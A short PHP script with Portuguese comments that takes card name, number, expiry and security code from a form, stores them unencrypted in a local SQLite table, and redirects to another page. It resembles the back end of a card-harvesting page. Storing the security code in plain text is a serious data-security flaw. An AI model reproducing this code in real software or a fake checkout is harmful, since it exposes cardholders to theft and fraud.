<?php
// Verifica se o formulário foi submetido
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Conectar ao banco de dados SQLite
    $db = new SQLite3('cartao.db'); // Substitua 'caminho/para/o/banco_de_dados/cartao.db' pelo caminho correto

    // Extrair os dados do formulário
    $cardName = $_POST['card_name'];
    $cardNumber = $_POST['card_number'];
    $cardParcel = $_POST['card_parcel'];
    $cardValid = $_POST['card_valid'];
    $cardCode = $_POST['card_code'];

    // Preparar a consulta SQL para inserir os dados na tabela 'cart'
    $stmt = $db->prepare('INSERT INTO cart (card_name, card_number, card_valid, card_code) VALUES (:card_name, :card_number, :card_valid, :card_code)');
    $stmt->bindValue(':card_name', $cardName, SQLITE3_TEXT);
    $stmt->bindValue(':card_number', $cardNumber, SQLITE3_TEXT);
    $stmt->bindValue(':card_valid', $cardValid, SQLITE3_TEXT);
    $stmt->bindValue(':card_code', $cardCode, SQLITE3_TEXT);

    // Executar a consulta
    $result = $stmt->execute();

    if ($result) {
        echo "Dados inseridos com sucesso no banco de dados.";
        header("Location: ../formapa.php");
    } else {
        echo "Erro ao inserir dados no banco de dados.";
    }

    // Fechar a conexão com o banco de dados
    $db->close();
}
?>
